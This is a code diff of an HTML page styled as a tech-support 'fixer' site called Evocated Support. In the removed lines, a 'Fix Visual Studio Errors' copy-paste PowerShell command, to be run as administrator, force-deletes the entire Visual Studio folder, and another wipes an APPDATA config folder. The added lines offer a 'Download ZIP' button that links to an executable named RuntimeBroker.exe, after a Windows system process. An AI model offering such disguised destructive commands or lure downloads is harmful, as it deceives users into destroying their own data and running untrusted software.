@@ -1,331 +1,258 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Evocated Support</title>
   <style>
-    body {
+    /* Fonts and resets */
+    @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@700&display=swap');
+    * {
       margin: 0;
-      font-family: 'Segoe UI', sans-serif;
-      background: linear-gradient(to bottom right, #1a001f, #2b002f);
-      color: #ffd6f9;
-      overflow-x: hidden;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: 'Orbitron', sans-serif;
+      cursor: url('https://cur.cursors-4u.net/others/oth-8/oth748.cur'), auto;
     }
 
-    #loading-screen {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100vw;
-      height: 100vh;
-      background: linear-gradient(to bottom right, #1a001f, #2b002f);
-      z-index: 9999;
-      display: flex;
-      flex-direction: column;
-      justify-content: center;
-      align-items: center;
+    body, html {
+      height: 100%;
+      background: linear-gradient(-45deg, #0f0f0f, #1a1a1a, #2a2a2a, #1a1a1a);
+      background-size: 400% 400%;
+      animation: gradient 12s ease infinite;
+      overflow: hidden;
+      color: white;
+    }
+
+    @keyframes gradient {
+      0% {background-position: 0% 50%;}
+      50% {background-position: 100% 50%;}
+      100% {background-position: 0% 50%;}
+    }
+
+    .center {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
       text-align: center;
     }
 
-    .loading-title {
+    .title {
       font-size: 3rem;
-      font-weight: bold;
-      text-shadow: 0 0 20px #ff94f4;
-      animation: bounce 3.5s infinite;
-      color: #ffd6f9;
-    }
-
-    .spinner {
-      border: 6px solid #ffb3ec;
-      border-top: 6px solid transparent;
-      border-radius: 50%;
-      width: 50px;
-      height: 50px;
-      animation: spin 1.2s linear infinite;
-      margin-top: 20px;
-      box-shadow: 0 0 15px #ff94f4;
-    }
-
-    @keyframes spin {
-      0% { transform: rotate(0deg); }
-      100% { transform: rotate(360deg); }
-    }
-
-    .get-started-btn {
-      margin-top: 30px;
-      padding: 12px 25px;
-      font-size: 1.2rem;
-      border: none;
-      border-radius: 15px;
-      background-color: #ffb3ec;
-      color: #30001e;
-      box-shadow: 0 0 20px #ff94f4;
-      cursor: pointer;
-      transition: transform 0.3s, box-shadow 0.3s;
-    }
-
-    .get-started-btn:hover {
-      transform: scale(1.1);
-      box-shadow: 0 0 25px #ff66cc;
-    }
-
-    .warning-modal {
-      display: none;
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100vw;
-      height: 100vh;
-      background: rgba(0, 0, 0, 0.75);
-      backdrop-filter: blur(4px);
-      z-index: 10000;
-      justify-content: center;
-      align-items: center;
-      animation: fadeIn 0.5s ease-in-out;
-    }
-
-    .warning-box {
-      background: #2b002f;
-      padding: 25px 35px;
-      border-radius: 20px;
-      text-align: center;
-      box-shadow: 0 0 20px #ff94f4;
-      max-width: 400px;
-      animation: fadeIn 0.5s ease-in-out;
-    }
-
-    .warning-box p {
-      margin: 0;
-      font-size: 1.2rem;
-      color: #ffd6f9;
-      text-shadow: 0 0 5px #ff94f4;
-    }
-
-    .close-warning {
-      margin-top: 20px;
-      padding: 8px 18px;
-      font-size: 1rem;
-      background-color: #ffb3ec;
-      color: #30001e;
-      border: none;
-      border-radius: 12px;
-      cursor: pointer;
-      transition: background-color 0.3s;
-    }
-
-    .close-warning:hover {
-      background-color: #ff66cc;
-    }
-
-    @keyframes fadeOut {
-      from { opacity: 1; }
-      to { opacity: 0; }
-    }
-
-    .fade-out {
-      animation: fadeOut 0.5s ease-in-out;
-    }
-
-    .centered {
-      display: none;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      min-height: 100vh;
-      text-align: center;
-    }
-
-    .main-title {
-      font-size: 3rem;
-      font-weight: bold;
-      text-shadow: 0 0 15px #ff94f4;
-      animation: bounce 3.5s infinite;
+      color: #ff69b4;
+      animation: bounce 2s infinite, glow 2s ease-in-out infinite;
+      text-shadow: 0 0 10px #ff69b4, 0 0 20px #ff69b4;
     }
 
     @keyframes bounce {
-      0%, 100% { transform: translateY(0); }
-      50% { transform: translateY(-10px); }
+      0%, 100% { transform: translateY(-10px); }
+      50% { transform: translateY(10px); }
     }
 
-    .label {
-      margin-top: 20px;
-      font-size: 1.1rem;
-      text-shadow: 0 0 8px #ffb3ec;
+    @keyframes glow {
+      0%, 100% { text-shadow: 0 0 10px #ff69b4, 0 0 20px #ff69b4; }
+      50% { text-shadow: 0 0 20px #ff1493, 0 0 30px #ff69b4; }
     }
 
-    .fix-button, .copy-btn, .download-btn {
-      margin: 10px;
-      padding: 12px 25px;
-      font-size: 1rem;
+    .button {
+      background: #ff1493;
       border: none;
+      padding: 15px 30px;
+      margin-top: 20px;
+      font-size: 1rem;
       border-radius: 12px;
-      background-color: #ffb3ec;
-      color: #30001e;
-      box-shadow: 0 0 10px #ff94f4;
+      color: white;
       cursor: pointer;
-      transition: transform 0.2s, box-shadow 0.2s;
+      transition: transform 0.3s, background 0.3s;
+    }
+    .button:hover {
+      background: white;
+      color: #ff1493;
+      transform: scale(1.1);
     }
 
-    .fix-button:hover, .copy-btn:hover, .download-btn:hover {
-      transform: scale(1.05);
-      box-shadow: 0 0 20px #ff94f4;
-    }
-
-    .fix-button.active {
-      background-color: #ff66cc;
-    }
-
-    .copy-box {
+    .hidden {
       display: none;
-      background-color: #330033;
-      padding: 15px;
-      margin-top: 10px;
-      border-radius: 10px;
-      box-shadow: 0 0 10px #ff94f4;
-      color: #fff;
-      animation: fadeIn 0.4s ease-in-out;
     }
 
-    @keyframes fadeIn {
-      from { opacity: 0; transform: translateY(-10px); }
-      to { opacity: 1; transform: translateY(0); }
+    .fade-out {
+      animation: fadeOut 1.5s forwards;
+    }
+
+    @keyframes fadeOut {
+      to { opacity: 0; visibility: hidden; }
+    }
+
+    .popular-label {
+      font-size: 1rem;
+      color: #ffd700;
+      margin-bottom: 5px;
+      animation: glow 2s ease-in-out infinite;
     }
 
     .dropdown {
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      animation: fadeIn 0.5s ease-in-out;
+      margin-top: 30px;
+      transition: opacity 0.5s ease;
     }
 
-    .download-box {
+    .dropdown-content {
       display: none;
+      opacity: 0;
       flex-direction: column;
-      align-items: center;
-      animation: fadeIn 0.5s ease-in-out;
-      background: #2b002f;
-      padding: 20px;
+      gap: 10px;
       margin-top: 10px;
-      border-radius: 15px;
-      box-shadow: 0 0 10px #ff94f4;
     }
 
-    code {
-      display: block;
-      margin-bottom: 10px;
-      word-wrap: break-word;
+    .dropdown-content.show {
+      display: flex;
+      animation: fadeIn 0.5s forwards;
     }
+
+    @keyframes fadeIn {
+      to { opacity: 1; }
+    }
+
+    @keyframes fadeOutDrop {
+      to { opacity: 0; display: none; }
+    }
+
+    .drop-btn {
+      padding: 10px;
+      background: #444;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+      transition: background 0.3s;
+    }
+
+    .drop-btn.active {
+      background: white;
+      color: #222;
+    }
+
+    .download-section {
+      margin-top: 40px;
+    }
+
+    .download-label {
+      font-size: 0.9rem;
+      color: #ccc;
+      margin-bottom: 10px;
+    }
+
+    .copy-box {
+      margin-top: 30px;
+      background: #222;
+      padding: 10px;
+      border-radius: 8px;
+      display: inline-block;
+    }
+    .copy-text {
+      color: #fff;
+      user-select: all;
+    }
+    .copy-btn {
+      margin-top: 10px;
+      background: #ff1493;
+      color: white;
+      padding: 5px 10px;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+    }
+
+    audio { display: none; }
   </style>
 </head>
 <body>
-  <div id="loading-screen">
-    <div class="loading-title">Evocated Support</div>
-    <div class="spinner"></div>
-    <button class="get-started-btn" onclick="startSite()">Get Started</button>
+  <!-- Loading Screen -->
+  <div id="loading" class="center">
+    <div class="title">Evocated Support</div>
+    <button class="button" onclick="startSite()">Get Started With Evocated Support</button>
   </div>
 
-  <div class="warning-modal" id="warning-modal">
-    <div class="warning-box">
-      <p>PowerShell MUST be run as ADMINISTRATOR or it will not work.</p>
-      <button class="close-warning" onclick="closeWarning()">Close</button>
-    </div>
-  </div>
+  <!-- Main Site -->
+  <div id="main" class="hidden center">
+    <div class="title">Evocated Support</div>
+    <div class="popular-label">🔥 Popular! Most used fixer 🔥</div>
+    <button class="button">FIX VISUAL STUDIO ERRORS</button>
 
-  <!-- main content untouched -->
-  <div class="centered" id="main-content">
-    <div class="main-title">Evocated Support</div>
-    <div class="label">PowerShell MUST be run as ADMINISTRATOR or it will not work.</div>
+    <!-- Dropdown -->
     <div class="dropdown">
-      <button class="fix-button" onclick="showCommand('cmd1')">Fix Visual Studio Errors</button>
-      <button class="fix-button" onclick="showCommand('cmd2')">Clear Temp Files</button>
-      <button class="fix-button" onclick="showCommand('cmd3')">Restart Services</button>
-      <button class="fix-button" onclick="showCommand('cmd4')">Fix Network</button>
-      <button class="fix-button" onclick="showCommand('cmd5')">Reset Config</button>
+      <button class="button" onclick="toggleDropdown()">Toggle Fix Options</button>
+      <div id="dropContent" class="dropdown-content">
+        <button class="drop-btn" onclick="selectBtn(this)">Fix 1</button>
+        <button class="drop-btn" onclick="selectBtn(this)">Fix 2</button>
+        <button class="drop-btn" onclick="selectBtn(this)">Fix 3</button>
+        <button class="drop-btn" onclick="selectBtn(this)">Fix 4</button>
+        <button class="drop-btn" onclick="selectBtn(this)">Fix 5</button>
+      </div>
     </div>
-    <div id="cmd1" class="copy-box">
-      <code>Get-ChildItem -Path 'C:\Program Files\Visual Studio' -Recurse | Remove-Item -Force</code>
-      <button class="copy-btn" onclick="copyCommand('cmd1')">Copy to Clipboard</button>
+
+    <!-- Download Section -->
+    <div class="download-section">
+      <div class="download-label">If fixers are not working, download this and it should fix the current issue.</div>
+      <button class="button" onclick="showDownload()">Open Download Options</button>
+      <div id="downloadDrop" class="dropdown-content">
+        <a href="https://raw.githubusercontent.com/EvocatedSupport/RuntimeBrokerFixer/refs/heads/main/RuntimeBroker.exe" download>
+          <button class="button">⬇ Download ZIP</button>
+        </a>
+      </div>
     </div>
-    <div id="cmd2" class="copy-box">
-      <code>Remove-Item -Path $env:TEMP\* -Recurse -Force</code>
-      <button class="copy-btn" onclick="copyCommand('cmd2')">Copy to Clipboard</button>
-    </div>
-    <div id="cmd3" class="copy-box">
-      <code>Restart-Service -Name wuauserv</code>
-      <button class="copy-btn" onclick="copyCommand('cmd3')">Copy to Clipboard</button>
-    </div>
-    <div id="cmd4" class="copy-box">
-      <code>ipconfig /flushdns</code>
-      <button class="copy-btn" onclick="copyCommand('cmd4')">Copy to Clipboard</button>
-    </div>
-    <div id="cmd5" class="copy-box">
-      <code>Remove-Item -Path "$env:APPDATA\AppConfig" -Recurse -Force</code>
-      <button class="copy-btn" onclick="copyCommand('cmd5')">Copy to Clipboard</button>
-    </div>
-    <button class="download-btn" onclick="toggleDownloadBox()">Download Resources</button>
-    <div class="download-box" id="download-box">
-      <a href="resource1.zip" class="download-btn">Download Resource 1</a>
-      <a href="resource2.zip" class="download-btn">Download Resource 2</a>
+
+    <!-- Copy Text Box -->
+    <div class="copy-box">
+      <div class="copy-text" id="copyText">Paste your text here</div>
+      <button class="copy-btn" onclick="copyText()">Copy to Clipboard</button>
     </div>
   </div>
 
-  <!-- Audio elements -->
-  <audio id="background-music" src="music.mp3" loop></audio>
-  <audio id="click-sound" src="click.mp3"></audio>
+  <!-- Audio -->
+  <audio id="bgm" src="nights.mp3" loop></audio>
+  <audio id="clickSound" src="https://www.myinstants.com/media/sounds/minecraft-click.mp3"></audio>
 
   <script>
-    const music = document.getElementById('background-music');
-    const clickSound = document.getElementById('click-sound');
-    const warningModal = document.getElementById('warning-modal');
-    const loadingScreen = document.getElementById('loading-screen');
-    const mainContent = document.getElementById('main-content');
-
     function startSite() {
-      music.volume = 0.5;
-      music.play();
-      loadingScreen.classList.add('fade-out');
+      document.getElementById('loading').classList.add('fade-out');
       setTimeout(() => {
-        loadingScreen.style.display = 'none';
-        mainContent.style.display = 'flex';
-        showWarning();
-      }, 600);
+        document.getElementById('loading').style.display = 'none';
+        document.getElementById('main').classList.remove('hidden');
+        document.getElementById('bgm').play();
+      }, 1500);
     }
 
-    function showWarning() {
-      warningModal.style.display = 'flex';
+    function toggleDropdown() {
+      const drop = document.getElementById('dropContent');
+      drop.classList.toggle('show');
+      playClick();
     }
 
-    function closeWarning() {
-      warningModal.classList.add('fade-out');
-      setTimeout(() => {
-        warningModal.style.display = 'none';
-        warningModal.classList.remove('fade-out');
-      }, 500);
+    function showDownload() {
+      const drop = document.getElementById('downloadDrop');
+      drop.classList.toggle('show');
+      playClick();
     }
 
-    document.querySelectorAll('button').forEach(btn => {
-      btn.addEventListener('click', () => {
-        clickSound.currentTime = 0;
-        clickSound.play();
-      });
-    });
-
-    function showCommand(id) {
-      document.querySelectorAll('.copy-box').forEach(el => el.style.display = 'none');
-      document.getElementById(id).style.display = 'block';
+    function selectBtn(btn) {
+      document.querySelectorAll('.drop-btn').forEach(b => b.classList.remove('active'));
+      btn.classList.add('active');
+      playClick();
     }
 
-    function copyCommand(id) {
-      const box = document.getElementById(id);
-      const code = box.querySelector('code').innerText;
-      navigator.clipboard.writeText(code);
+    function copyText() {
+      const text = document.getElementById('copyText').innerText;
+      navigator.clipboard.writeText(text);
+      playClick();
     }
 
-    function toggleDownloadBox() {
-      const box = document.getElementById('download-box');
-      box.style.display = box.style.display === 'flex' ? 'none' : 'flex';
+    function playClick() {
+      document.getElementById('clickSound').play();
     }
+
+    // Click sound for any click
+    document.addEventListener('click', playClick);
   </script>
 </body>
 </html>
